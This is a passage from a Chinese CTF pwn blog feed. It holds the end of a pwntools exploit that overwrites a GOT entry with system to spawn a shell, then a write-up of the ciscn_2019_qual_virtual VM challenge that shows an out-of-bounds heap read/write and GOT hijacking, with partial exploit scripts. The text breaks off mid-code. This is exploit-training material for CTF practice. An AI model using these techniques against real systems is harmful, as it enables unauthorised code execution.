punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'libc'</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>dbg<span class="token punctuation">(</span><span class="token string">'b *0x8048671'</span><span class="token punctuation">)</span>payload<span class="token operator">=</span>p32<span class="token punctuation">(</span><span class="token number">0x8048671</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>ls<span class="token punctuation">(</span><span class="token string">'gets'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>ls<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>s<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token comment">#dbg('')</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''0x3a80c execve("/bin/sh", esp+0x28, environ)constraints:  esi is the GOT address of libc  [esp+0x28] == NULL0x3a80e execve("/bin/sh", esp+0x2c, environ)constraints:  esi is the GOT address of libc  [esp+0x2c] == NULL0x3a812 execve("/bin/sh", esp+0x30, environ)constraints:  esi is the GOT address of libc  [esp+0x30] == NULL0x3a819 execve("/bin/sh", esp+0x34, environ)constraints:  esi is the GOT address of libc  [esp+0x34] == NULL0x5f065 execl("/bin/sh", eax)constraints:  esi is the GOT address of libc  eax == NULL0x5f066 execl("/bin/sh", [esp])constraints:  esi is the GOT address of libc  [esp] == NULL'''</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span>bits<span class="token operator">=</span><span class="token number">32</span><span class="token punctuation">,</span>endian<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span><span class="token string">"splitw"</span><span class="token punctuation">,</span><span class="token string">"-h"</span><span class="token punctuation">,</span><span class="token string">"-l 150"</span><span class="token punctuation">]</span>binary<span class="token operator">=</span><span class="token string">'./bf'</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>s  <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num      <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>rl  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>ep   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>data<span class="token punctuation">]</span>eg   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>data<span class="token punctuation">]</span>es   <span class="token operator">=</span> <span class="token keyword">lambda</span> data       <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>ls   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>itr  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ic   <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTFpwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 每周一pwn系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024-12第二周：ciscn_2019_qual_virtual</title>
      <link href="/2024/12/13/2024-12%E7%AC%AC%E4%BA%8C%E5%91%A8%EF%BC%9Aciscn_2019_qual_virtual/"/>
      <url>/2024/12/13/2024-12%E7%AC%AC%E4%BA%8C%E5%91%A8%EF%BC%9Aciscn_2019_qual_virtual/</url>
      
        <content type="html"><![CDATA[<blockquote><p>赛题地址：<a href="https://buuoj.cn/challenges#ciscn_2019_qual_virtual">BUUCTF在线评测</a></p></blockquote><p>vmpwn初探</p><h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><p><img src="/EXP_FILE/6b35aee306536e9016983f2737a30397_MD5.jpeg"></p><h1 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h1><h2 id="各虚拟段初始化"><a href="#各虚拟段初始化" class="headerlink" title="各虚拟段初始化"></a>各虚拟段初始化</h2><p><img src="/EXP_FILE/cbad4ec09039da31682729a93cf874c9_MD5.jpeg"><br>如图：<br><img src="/EXP_FILE/eab6d937744654ea3eadfbf50981a3ad_MD5.jpeg"></p><h2 id="opcode解析部分"><a href="#opcode解析部分" class="headerlink" title="opcode解析部分"></a>opcode解析部分</h2><p>将我们输入的指令转为opcode<br><img src="/EXP_FILE/ec885429b943018f0189461ba9692f22_MD5.jpeg"></p><ul><li>copy<br>即以每8字节为单位赋值：<code>*(segment+idx++)=a2</code><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">copy</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span>a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+1Ch] [rbp-4h]</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>a1 <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>a1 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>                 <span class="token comment">// 0</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">==</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>a1 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>              <span class="token comment">// if(v3==size)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">*</span>a1 <span class="token operator">+</span> v3<span class="token punctuation">)</span> <span class="token operator">=</span> a2<span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>a1 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">=</span> v3<span class="token punctuation">;</span>                     <span class="token comment">// idx=v3</span>  <span class="token keyword">return</span> <span class="token number">1LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="opcode执行部分"><a href="#opcode执行部分" class="headerlink" title="opcode执行部分"></a>opcode执行部分</h2><p><img src="/EXP_FILE/b17e9f18d757fb913521b21fb1beddb5_MD5.jpeg"></p><ul><li>get<br>即取出 opcode 并返回：<code>*a2=*(segment+idx--)</code><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span>a1<span class="token punctuation">,</span> _QWORD <span class="token operator">*</span>a2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>a1 <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>a1 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token operator">*</span>a2 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">*</span>a1 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>a1 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">1LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><hr><ul><li>push<pre class="line-numbers language-c" data-language="c"><code class="language-c">_BOOL8 __fastcall <span class="token function">push</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span>data_addr<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span>stack_addr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 a2<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-8h] BYREF</span>  <span class="token keyword">return</span> <span class="token function">get</span><span class="token punctuation">(</span>stack_addr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>a2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">copy</span><span class="token punctuation">(</span>data_addr<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>从stack取出数据，放到data里</p><ul><li><p>pop</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">_BOOL8 __fastcall <span class="token function">pop</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span>data_addr<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span>stack_addr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-8h] BYREF</span>  <span class="token keyword">return</span> <span class="token function">get</span><span class="token punctuation">(</span>data_addr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v3<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">copy</span><span class="token punctuation">(</span>stack_addr<span class="token punctuation">,</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从data取出数据，放到stack里</p></li><li><p>add</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span>data_addr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 a2<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-10h] BYREF</span>  __int64 v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-8h] BYREF</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">get</span><span class="token punctuation">(</span>data_addr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>a2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">get</span><span class="token punctuation">(</span>data_addr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v3<span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">copy</span><span class="token punctuation">(</span>data_addr<span class="token punctuation">,</span> v3 <span class="token operator">+</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从data中取两个值相加，放到data</p></li><li><p>sub</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">sub</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span>data_addr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 a2<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-10h] BYREF</span>  __int64 v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-8h] BYREF</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">get</span><span class="token punctuation">(</span>data_addr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>a2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">get</span><span class="token punctuation">(</span>data_addr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v3<span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">copy</span><span class="token punctuation">(</span>data_addr<span class="token punctuation">,</span> a2 <span class="token operator">-</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从data中取两个值相减，放到data</p></li><li><p>mul</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">mul</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span>data_addr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 a2<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-10h] BYREF</span>  __int64 v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-8h] BYREF</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">get</span><span class="token punctuation">(</span>data_addr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>a2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">get</span><span class="token punctuation">(</span>data_addr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v3<span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">copy</span><span class="token punctuation">(</span>data_addr<span class="token punctuation">,</span> v3 <span class="token operator">*</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从data中取两个值相乘，放到data</p></li><li><p>div</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">div</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span>data_addr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 a2<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-10h] BYREF</span>  __int64 v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-8h] BYREF</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">get</span><span class="token punctuation">(</span>data_addr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>a2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">get</span><span class="token punctuation">(</span>data_addr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v3<span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">copy</span><span class="token punctuation">(</span>data_addr<span class="token punctuation">,</span> a2 <span class="token operator">/</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从data中取两个值相除，放到data</p></li><li><p>load</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">load</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span>data_addr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 a2<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-10h] BYREF</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">get</span><span class="token punctuation">(</span>data_addr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>a2<span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">copy</span><span class="token punctuation">(</span>data_addr<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">*</span>data_addr <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span>data_addr <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> a2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//copy(data_addr,*(data+idx+a2))</span>  <span class="token keyword">else</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从data里取出一个值a2作为下标，并将该下标对应的值放入data中</p></li><li><p>save</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">save</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span>data_addr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-10h] BYREF</span>  __int64 v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-8h] BYREF</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">get</span><span class="token punctuation">(</span>data_addr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v2<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">get</span><span class="token punctuation">(</span>data_addr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v3<span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span>data_addr <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>data_addr <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> v2<span class="token punctuation">)</span> <span class="token operator">=</span> v3<span class="token punctuation">;</span>  <span class="token comment">//*(data+idx+v2)=v3</span>  <span class="token keyword">return</span> <span class="token number">1LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从data里取出值v2作为下标和v3作为值，将v3赋值给v2下标对应的值</p></li></ul><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>通过上面的分析，我们找到了两个漏洞，对堆的任意地址的读写漏洞。但是不好泄露地址怎么办，其实不需要泄露<br>，利用好给出的加减指令</p><ol><li><p>劫持 data 到一块空内存<br>劫持到bss上。<br>因为idx&#x3D;-1，所以偏移要加回去</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">push push save0x404650 -4+1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>把 puts 真实地址读到该内存区域<br>算一下 puts_got 和劫持完成之后的 data 的偏移为 0xe0</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">push load-1c+1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>获取 system 真实地址<br>计算 system 和 puts 的偏移，放到 data 上</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">push add-0x2a300<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>把 data 里的 system 地址赋值给 puts_got</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">push save-1c+1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol><h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><p>save：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>sla<span class="token punctuation">(</span><span class="token string">'Your program name:'</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>instruction <span class="token operator">=</span> <span class="token string">'push push save'</span>sla<span class="token punctuation">(</span><span class="token string">'Your instruction:'</span><span class="token punctuation">,</span>instruction<span class="token punctuation">)</span><span class="token comment">#dbg('b *0x0000000000401D98\n')</span>stack<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> sla<span class="token punctuation">(</span><span class="token string">'Your stack data:'</span><span class="token punctuation">,</span>stack<span class="token punctuation">)</span><span class="token comment">#dbg('')</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>load：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>sla<span class="token punctuation">(</span><span class="token string">'Your program name:'</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>instruction <span class="token operator">=</span> <span class="token string">'push load'</span>sla<span class="token punctuation">(</span><span class="token string">'Your instruction:'</span><span class="token punctuation">,</span>instruction<span class="token punctuation">)</span><span class="token comment">#dbg('b *0x00000000004014A0\n')</span>stack<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> sla<span class="token punctuation">(</span><span class="token string">'Your stack data:'</span><span class="token punctuation">,</span>stack<span class="token 